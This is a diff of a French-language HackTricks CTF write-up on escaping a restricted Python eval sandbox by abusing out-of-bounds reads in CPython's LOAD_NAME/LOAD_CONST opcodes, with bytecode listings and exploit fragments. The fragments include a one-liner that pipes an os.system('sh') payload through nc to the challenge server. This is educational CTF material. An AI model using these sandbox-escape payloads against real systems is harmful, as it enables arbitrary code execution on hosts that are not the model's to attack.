@@ -1,29 +1,29 @@
-# LOAD_NAME / LOAD_CONST opcode OOB Read
+# LOAD\_NAME / LOAD\_CONST opcode OOB Read
 
 {% hint style="success" %}
-Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Soutenez HackTricks</summary>
+<summary>Soutenir HackTricks</summary>
 
-* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
 
-**Ces informations ont été extraites** [**de ce compte-rendu**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
+**Cette info a été prise** [**de cette rédaction**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Nous pouvons utiliser la fonction de lecture OOB dans l'opcode LOAD_NAME / LOAD_CONST pour obtenir un symbole en mémoire. Cela signifie utiliser un astuce comme `(a, b, c, ... des centaines de symboles ..., __getattribute__) if [] else [].__getattribute__(...)` pour obtenir un symbole (tel qu'un nom de fonction) que vous souhaitez.
+Nous pouvons utiliser la fonctionnalité OOB read dans l'opcode LOAD\_NAME / LOAD\_CONST pour obtenir un symbole dans la mémoire. Ce qui signifie utiliser un truc comme `(a, b, c, ... des centaines de symboles ..., __getattribute__) if [] else [].__getattribute__(...)` pour obtenir un symbole (tel qu'un nom de fonction) que vous souhaitez.
 
-Ensuite, il suffit de concevoir votre exploit.
+Ensuite, il suffit de créer votre exploit.
 
-### Aperçu <a href="#overview-1" id="overview-1"></a>
+### Overview <a href="#overview-1" id="overview-1"></a>
 
 Le code source est assez court, ne contient que 4 lignes !
 ```python
@@ -32,9 +32,13 @@ if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-### Lecture hors limites <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+Vous pouvez entrer du code Python arbitraire, et il sera compilé en un [objet code Python](https://docs.python.org/3/c-api/code.html). Cependant, `co_consts` et `co_names` de cet objet code seront remplacés par un tuple vide avant d'évaluer cet objet code.
 
-Comment se produit le plantage de segment ?
+Ainsi, toutes les expressions contenant des consts (par exemple, des nombres, des chaînes, etc.) ou des noms (par exemple, des variables, des fonctions) pourraient finalement provoquer un segmentation fault.
+
+### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+
+Comment se produit le segfault ?
 
 Commençons par un exemple simple, `[a, b, c]` pourrait être compilé en le bytecode suivant.
 ```
@@ -44,11 +48,11 @@ Commençons par un exemple simple, `[a, b, c]` pourrait être compilé en le byt
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-Mais que se passe-t-il si `co_names` devient un tuple vide ? L'opcode `LOAD_NAME 2` est toujours exécuté, et tente de lire la valeur à partir de cette adresse mémoire où elle aurait dû être initialement. Oui, c'est une fonctionnalité de lecture hors limites.
+Mais que se passe-t-il si le `co_names` devient un tuple vide ? L'opcode `LOAD_NAME 2` est toujours exécuté et essaie de lire la valeur à partir de cette adresse mémoire qu'il devrait initialement être. Oui, c'est une "fonctionnalité" de lecture hors limites.
 
-Le concept central de la solution est simple. Certains opcodes dans CPython, par exemple `LOAD_NAME` et `LOAD_CONST`, sont vulnérables (?) à la lecture hors limites.
+Le concept de base de la solution est simple. Certains opcodes dans CPython, par exemple `LOAD_NAME` et `LOAD_CONST`, sont vulnérables (?) à la lecture hors limites.
 
-Ils récupèrent un objet à l'index `oparg` du tuple `consts` ou `names` (c'est ce que `co_consts` et `co_names` sont nommés en interne). Nous pouvons nous référer au court extrait suivant sur `LOAD_CONST` pour voir ce que CPython fait lorsqu'il traite l'opcode `LOAD_CONST`.
+Ils récupèrent un objet à partir de l'index `oparg` du tuple `consts` ou `names` (c'est ce que `co_consts` et `co_names` sont appelés en interne). Nous pouvons nous référer au court extrait suivant sur `LOAD_CONST` pour voir ce que CPython fait lorsqu'il traite l'opcode `LOAD_CONST`.
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -58,21 +62,21 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-De cette manière, nous pouvons utiliser la fonctionnalité OOB pour obtenir un "nom" à partir d'un décalage mémoire arbitraire. Pour être sûr du nom et de son décalage, il suffit de continuer à essayer `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Et vous pourriez trouver quelque chose à environ oparg > 700. Vous pouvez également essayer d'utiliser gdb pour jeter un œil à la disposition de la mémoire bien sûr, mais je ne pense pas que ce serait plus facile?
+De cette manière, nous pouvons utiliser la fonctionnalité OOB pour obtenir un "nom" à partir d'un décalage mémoire arbitraire. Pour s'assurer de quel nom il s'agit et quel est son décalage, il suffit d'essayer `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Et vous pourriez trouver quelque chose dans environ oparg > 700. Vous pouvez également essayer d'utiliser gdb pour jeter un œil à la disposition de la mémoire, bien sûr, mais je ne pense pas que ce serait plus facile ?
 
 ### Génération de l'Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Une fois que nous avons récupéré ces décalages utiles pour les noms / constantes, comment _obtenir_ un nom / constante à partir de ce décalage et l'utiliser? Voici un truc pour vous:\
-Supposons que nous puissions obtenir un nom `__getattribute__` à partir du décalage 5 (`LOAD_NAME 5`) avec `co_names=()`, il suffit de faire ce qui suit:
+Une fois que nous avons récupéré ces décalages utiles pour les noms / consts, comment _obtenons-nous_ un nom / const à partir de ce décalage et l'utilisons-nous ? Voici une astuce pour vous :\
+Supposons que nous puissions obtenir un nom `__getattribute__` à partir du décalage 5 (`LOAD_NAME 5`) avec `co_names=()`, alors faites simplement les choses suivantes :
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> Remarquez qu'il n'est pas nécessaire de le nommer `__getattribute__`, vous pouvez le nommer avec un nom plus court ou plus bizarre
+> Remarquez qu'il n'est pas nécessaire de l'appeler `__getattribute__`, vous pouvez l'appeler quelque chose de plus court ou d'étrange.
 
-Vous pouvez comprendre la raison en visualisant simplement son bytecode :
+Vous pouvez comprendre la raison en consultant simplement son bytecode :
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -89,20 +93,20 @@ Vous pouvez comprendre la raison en visualisant simplement son bytecode :
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-Notez que `LOAD_ATTR` récupère également le nom à partir de `co_names`. Python charge les noms à partir du même décalage si le nom est le même, donc le deuxième `__getattribute__` est toujours chargé à partir du décalage=5. En utilisant cette fonctionnalité, nous pouvons utiliser un nom arbitraire une fois que le nom est en mémoire à proximité.
+Remarquez que `LOAD_ATTR` récupère également le nom à partir de `co_names`. Python charge les noms à partir du même décalage si le nom est identique, donc le deuxième `__getattribute__` est toujours chargé à partir de offset=5. En utilisant cette fonctionnalité, nous pouvons utiliser un nom arbitraire une fois que le nom est en mémoire à proximité.
 
 Pour générer des nombres, cela devrait être trivial :
 
-* 0: not \[\[]]
-* 1: not \[]
-* 2: (not \[]) + (not \[])
+* 0 : pas \[\[]]
+* 1 : pas \[]
+* 2 : (pas \[]) + (pas \[])
 * ...
 
-### Script d'Exploitation <a href="#exploit-script-1" id="exploit-script-1"></a>
+### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-Je n'ai pas utilisé de constantes en raison de la limite de longueur.
+Je n'ai pas utilisé de consts en raison de la limite de longueur.
 
-Tout d'abord, voici un script pour nous permettre de trouver ces décalages de noms.
+Tout d'abord, voici un script pour nous aider à trouver ces décalages de noms.
 ```python
 from types import CodeType
 from opcode import opmap
@@ -214,7 +218,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Il fait essentiellement les choses suivantes, pour les chaînes que nous obtenons à partir de la méthode `__dir__`:
+Il fait essentiellement les choses suivantes, pour ces chaînes, nous les obtenons à partir de la méthode `__dir__` :
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -228,16 +232,16 @@ getattr(
 builtins['eval'](builtins['input']())
 ```
 {% hint style="success" %}
-Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Soutenez HackTricks</summary>
+<summary>Soutenir HackTricks</summary>
 
-* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
